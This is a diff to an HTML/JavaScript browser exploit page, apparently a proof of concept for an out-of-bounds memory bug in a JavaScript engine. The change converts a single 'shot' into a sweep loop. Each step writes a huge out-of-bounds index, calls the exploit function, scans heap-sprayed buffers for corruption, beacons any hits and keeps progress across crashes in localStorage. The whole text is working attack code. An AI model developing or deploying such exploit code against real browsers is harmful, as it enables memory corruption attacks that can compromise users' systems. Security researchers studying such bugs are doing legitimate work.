@@ -68,24 +68,27 @@ for (var i = 2; w < 60000; i++) {
 }
 
 
-// THE SHOT: offset = tahir*4 bytes past elements; step 1GB in index units (4GB in bytes)
+// SWEEP LOOP: all shots in one page life; crash -> watchdog reload -> continue from localStorage
 var MAXN = 15;
-var idx = 0x100000000 + N * 0x40000000;
-tahir = idx;
-beacon('shot', 'n=' + N + ' idx=0x' + idx.toString(16));
-try { poc(35); } catch(e) { beacon('shot-exc', String(e).slice(0,80)); }
-tahir = 1;
-beacon('survived', 'n=' + N);
-
-// scan spray for 0xA00
-for (var b = 0; b < bufs.length; b++) {
-  var u = bufs[b];
-  for (var w2 = 0; w2 < u.length; w2++) {
-    if (u[w2] !== 0xABABABAB) { beacon('HIT', 'n=' + N + ' buf=' + b + ' w=' + w2 + ' v=0x' + (u[w2]>>>0).toString(16)); break; }
+var n = N;
+function sweepStep() {
+  if (n >= MAXN) { beacon('sweep-done', 'n=' + n); return; }
+  var idx = 0x100000000 + n * 0x40000000;
+  tahir = idx;
+  beacon('shot', 'n=' + n + ' idx=0x' + idx.toString(16));
+  try { poc(35); } catch(e) { beacon('shot-exc', String(e).slice(0,80)); }
+  tahir = 1;
+  beacon('survived', 'n=' + n);
+  for (var b = 0; b < bufs.length; b++) {
+    var u = bufs[b];
+    for (var w2 = 0; w2 < u.length; w2++) {
+      if (u[w2] !== 0xABABABAB) { beacon('HIT', 'n=' + n + ' buf=' + b + ' w=' + w2 + ' v=0x' + (u[w2]>>>0).toString(16)); break; }
+    }
   }
+  n++;
+  try { localStorage.setItem('esc1_n', String(n)); } catch(e) {}
+  setTimeout(sweepStep, 1500);
 }
-
-try { localStorage.setItem('esc1_n', String(Math.min(N + 1, MAXN))); } catch(e) {}
-if (N < MAXN) { setTimeout(function(){ location.reload(); }, 20000); }
+sweepStep();
 
 </script></body></html>
